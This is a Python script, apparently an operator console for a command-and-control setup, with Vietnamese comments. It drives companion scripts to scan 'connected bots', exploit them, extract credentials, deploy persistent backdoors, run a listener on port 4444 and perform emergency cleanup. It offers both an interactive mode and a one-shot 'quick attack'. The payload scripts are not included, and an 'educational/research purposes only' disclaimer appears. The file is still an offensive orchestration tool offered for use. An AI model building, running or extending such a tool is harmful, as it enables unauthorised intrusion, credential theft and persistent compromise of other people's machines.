#!/usr/bin/env python3
"""
Bot Master Controller - Tổng hợp tất cả công cụ khai thác bot
Master controller để quản lý và khai thác bot lạ đã kết nối
"""

import os
import sys
import time
import json
import subprocess
from datetime import datetime
from typing import Dict, List, Set, Optional

class BotMasterController:
    def __init__(self):
        self.scripts_dir = os.path.dirname(__file__)
        self.active_bots = []
        self.exploited_bots = []
        self.intelligence_data = {}
        self.backdoor_sessions = {}
        
    def run_script(self, script_name: str, args: List[str] = None) -> bool:
        """Chạy script với arguments"""
        try:
            script_path = os.path.join(self.scripts_dir, script_name)
            if not os.path.exists(script_path):
                print(f"❌ Script not found: {script_path}")
                return False
            
            cmd = [sys.executable, script_path]
            if args:
                cmd.extend(args)
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"✅ {script_name} executed successfully")
                if result.stdout:
                    print(result.stdout)
                return True
            else:
                print(f"❌ {script_name} failed: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"❌ Error running {script_name}: {e}")
            return False
    
    def scan_connected_bots(self) -> List[Dict]:
        """Quét các bot đang kết nối"""
        print("🔍 Scanning for connected bots...")
        
        # Sử dụng bot_monitor để quét
        result = subprocess.run([
            sys.executable, os.path.join(self.scripts_dir, "bot_monitor.py"), "--scan"
        ], capture_output=True, text=True)
        
        if result.returncode == 0:
            print("✅ Bot scan completed")
            print(result.stdout)
        else:
            print("❌ Bot scan failed")
            print(result.stderr)
        
        return []
    
    def exploit_bot(self, bot_ip: str, bot_port: int) -> bool:
        """Khai thác bot"""
        print(f"🎯 Exploiting bot {bot_ip}:{bot_port}")
        
        # 1. Intelligence gathering
        print("1️⃣ Gathering intelligence...")
        success = self.run_script("bot_intelligence.py", ["--intel", f"{bot_ip}:{bot_port}"])
        
        # 2. Full exploitation
        print("2️⃣ Full exploitation...")
        success = self.run_script("bot_exploiter.py", ["--exploit", f"{bot_ip}:{bot_port}"])
        
        # 3. Deploy backdoor
        print("3️⃣ Deploying backdoor...")
        success = self.run_script("bot_backdoor.py", ["--attack", f"{bot_ip}:{bot_port}"])
        
        if success:
            self.exploited_bots.append({
                'ip': bot_ip,
                'port': bot_port,
                'timestamp': datetime.now().isoformat(),
                'status': 'exploited'
            })
            print(f"✅ Bot {bot_ip}:{bot_port} exploited successfully")
            return True
        else:
            print(f"❌ Failed to exploit bot {bot_ip}:{bot_port}")
            return False
    
    def gather_intelligence(self, bot_ip: str, bot_port: int) -> bool:
        """Thu thập thông tin tình báo"""
        print(f"🔍 Gathering intelligence from {bot_ip}:{bot_port}")
        
        # System intelligence
        self.run_script("bot_intelligence.py", ["--system", f"{bot_ip}:{bot_port}"])
        
        # User intelligence
        self.run_script("bot_intelligence.py", ["--users", f"{bot_ip}:{bot_port}"])
        
        # Credential intelligence
        self.run_script("bot_intelligence.py", ["--creds", f"{bot_ip}:{bot_port}"])
        
        # Network intelligence
        self.run_script("bot_intelligence.py", ["--network", f"{bot_ip}:{bot_port}"])
        
        # Malware intelligence
        self.run_script("bot_intelligence.py", ["--malware", f"{bot_ip}:{bot_port}"])
        
        print(f"✅ Intelligence gathering completed for {bot_ip}:{bot_port}")
        return True
    
    def extract_credentials(self, bot_ip: str, bot_port: int) -> bool:
        """Trích xuất credentials từ bot"""
        print(f"🔐 Extracting credentials from {bot_ip}:{bot_port}")
        
        # Sử dụng bot_exploiter để lấy credentials
        success = self.run_script("bot_exploiter.py", ["--creds", f"{bot_ip}:{bot_port}"])
        
        if success:
            print(f"✅ Credentials extracted from {bot_ip}:{bot_port}")
            return True
        else:
            print(f"❌ Failed to extract credentials from {bot_ip}:{bot_port}")
            return False
    
    def deploy_backdoor(self, bot_ip: str, bot_port: int) -> bool:
        """Deploy backdoor lên bot"""
        print(f"🚀 Deploying backdoor to {bot_ip}:{bot_port}")
        
        # Deploy Python backdoor
        success = self.run_script("bot_backdoor.py", ["--deploy", f"{bot_ip}:{bot_port}:python"])
        
        # Create persistence
        if success:
            self.run_script("bot_backdoor.py", ["--persist", f"{bot_ip}:{bot_port}"])
        
        if success:
            print(f"✅ Backdoor deployed to {bot_ip}:{bot_port}")
            return True
        else:
            print(f"❌ Failed to deploy backdoor to {bot_ip}:{bot_port}")
            return False
    
    def start_backdoor_listener(self, port: int = 4444):
        """Khởi động backdoor listener"""
        print(f"🎧 Starting backdoor listener on port {port}")
        
        # Start listener
        self.run_script("bot_backdoor.py", ["--listener", str(port)])
    
    def emergency_cleanup(self):
        """Xử lý khẩn cấp"""
        print("🚨 Emergency cleanup mode")
        
        # Chạy emergency cleanup
        self.run_script("emergency_bot_cleanup.py", ["--cleanup"])
    
    def show_exploited_bots(self):
        """Hiển thị danh sách bot đã khai thác"""
        print("📋 Exploited Bots:")
        print("=" * 50)
        
        if self.exploited_bots:
            for i, bot in enumerate(self.exploited_bots):
                print(f"[{i+1}] {bot['ip']}:{bot['port']} - {bot['status']} - {bot['timestamp']}")
        else:
            print("❌ No exploited bots found")
    
    def show_available_tools(self):
        """Hiển thị các công cụ có sẵn"""
        print("🛠️ Available Tools:")
        print("=" * 50)
        
        tools = [
            ("bot_monitor.py", "Monitor bot connections"),
            ("bot_exploiter.py", "Exploit bot systems"),
            ("bot_intelligence.py", "Gather intelligence"),
            ("bot_backdoor.py", "Create backdoors"),
            ("emergency_bot_cleanup.py", "Emergency cleanup"),
            ("bot_security_manager.py", "Security management"),
            ("secure_c2_config.py", "Secure configuration"),
            ("secure_c2_server.py", "Secure C2 server")
        ]
        
        for tool, description in tools:
            tool_path = os.path.join(self.scripts_dir, tool)
            status = "✅" if os.path.exists(tool_path) else "❌"
            print(f"  {status} {tool:25} - {description}")
    
    def interactive_mode(self):
        """Interactive mode"""
        print("🎯 Bot Master Controller - Interactive Mode")
        print("=" * 60)
        print("⚠️  For educational/research purposes only!")
        print("")
        
        while True:
            print("\n📋 Available commands:")
            print("  1. scan      - Scan connected bots")
            print("  2. exploit   - Exploit specific bot")
            print("  3. intel     - Gather intelligence")
            print("  4. creds     - Extract credentials")
            print("  5. backdoor  - Deploy backdoor")
            print("  6. listener  - Start backdoor listener")
            print("  7. cleanup   - Emergency cleanup")
            print("  8. tools     - Show available tools")
            print("  9. exploited - Show exploited bots")
            print("  10. quit     - Exit")
            
            try:
                command = input("\n🎯 master@c2:~$ ").strip().lower()
                
                if command == "scan":
                    self.scan_connected_bots()
                
                elif command == "exploit":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    self.exploit_bot(ip, port)
                
                elif command == "intel":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    self.gather_intelligence(ip, port)
                
                elif command == "creds":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    self.extract_credentials(ip, port)
                
                elif command == "backdoor":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    self.deploy_backdoor(ip, port)
                
                elif command == "listener":
                    port = int(input("Enter listener port (default 4444): ").strip() or "4444")
                    self.start_backdoor_listener(port)
                
                elif command == "cleanup":
                    self.emergency_cleanup()
                
                elif command == "tools":
                    self.show_available_tools()
                
                elif command == "exploited":
                    self.show_exploited_bots()
                
                elif command == "quit":
                    break
                
                else:
                    print("❓ Unknown command")
                    
            except KeyboardInterrupt:
                print("\n👋 Goodbye!")
                break
            except Exception as e:
                print(f"❌ Error: {e}")
    
    def quick_attack(self, bot_ip: str, bot_port: int):
        """Quick attack - khai thác nhanh bot"""
        print(f"⚡ Quick attack on {bot_ip}:{bot_port}")
        print("=" * 50)
        
        # 1. Scan và phân tích
        print("1️⃣ Scanning bot...")
        self.scan_connected_bots()
        
        # 2. Lấy thông tin cơ bản
        print("2️⃣ Getting basic info...")
        self.run_script("bot_exploiter.py", ["--info", f"{bot_ip}:{bot_port}"])
        
        # 3. Lấy credentials
        print("3️⃣ Extracting credentials...")
        self.extract_credentials(bot_ip, bot_port)
        
        # 4. Deploy backdoor
        print("4️⃣ Deploying backdoor...")
        self.deploy_backdoor(bot_ip, bot_port)
        
        print(f"✅ Quick attack completed on {bot_ip}:{bot_port}")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Bot Master Controller - Master Tool for Bot Exploitation")
    parser.add_argument('--scan', action='store_true', help='Scan connected bots')
    parser.add_argument('--exploit', type=str, help='Exploit bot (IP:PORT)')
    parser.add_argument('--intel', type=str, help='Gather intelligence (IP:PORT)')
    parser.add_argument('--creds', type=str, help='Extract credentials (IP:PORT)')
    parser.add_argument('--backdoor', type=str, help='Deploy backdoor (IP:PORT)')
    parser.add_argument('--listener', type=int, help='Start backdoor listener on port')
    parser.add_argument('--cleanup', action='store_true', help='Emergency cleanup')
    parser.add_argument('--tools', action='store_true', help='Show available tools')
    parser.add_argument('--quick', type=str, help='Quick attack (IP:PORT)')
    parser.add_argument('--interactive', action='store_true', help='Interactive mode')
    
    args = parser.parse_args()
    
    controller = BotMasterController()
    
    if args.scan:
        controller.scan_connected_bots()
    
    elif args.exploit:
        if ':' in args.exploit:
            ip, port = args.exploit.split(':', 1)
            port = int(port)
            controller.exploit_bot(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.intel:
        if ':' in args.intel:
            ip, port = args.intel.split(':', 1)
            port = int(port)
            controller.gather_intelligence(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.creds:
        if ':' in args.creds:
            ip, port = args.creds.split(':', 1)
            port = int(port)
            controller.extract_credentials(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.backdoor:
        if ':' in args.backdoor:
            ip, port = args.backdoor.split(':', 1)
            port = int(port)
            controller.deploy_backdoor(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.listener:
        controller.start_backdoor_listener(args.listener)
    
    elif args.cleanup:
        controller.emergency_cleanup()
    
    elif args.tools:
        controller.show_available_tools()
    
    elif args.quick:
        if ':' in args.quick:
            ip, port = args.quick.split(':', 1)
            port = int(port)
            controller.quick_attack(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.interactive:
        controller.interactive_mode()
    
    else:
        print("🎯 Bot Master Controller - Master Tool for Bot Exploitation")
        print("⚠️  For educational/research purposes only!")
        print("")
        print("Available commands:")
        print("  --scan        Scan connected bots")
        print("  --exploit     Exploit bot (IP:PORT)")
        print("  --intel       Gather intelligence (IP:PORT)")
        print("  --creds       Extract credentials (IP:PORT)")
        print("  --backdoor    Deploy backdoor (IP:PORT)")
        print("  --listener    Start backdoor listener on port")
        print("  --cleanup     Emergency cleanup")
        print("  --tools       Show available tools")
        print("  --quick       Quick attack (IP:PORT)")
        print("  --interactive Interactive mode")
        print("")
        print("Examples:")
        print("  python3 bot_master_controller.py --scan")
        print("  python3 bot_master_controller.py --exploit 192.168.1.100:7777")
        print("  python3 bot_master_controller.py --quick 192.168.1.100:7777")
        print("  python3 bot_master_controller.py --interactive")

if __name__ == "__main__":
    main()
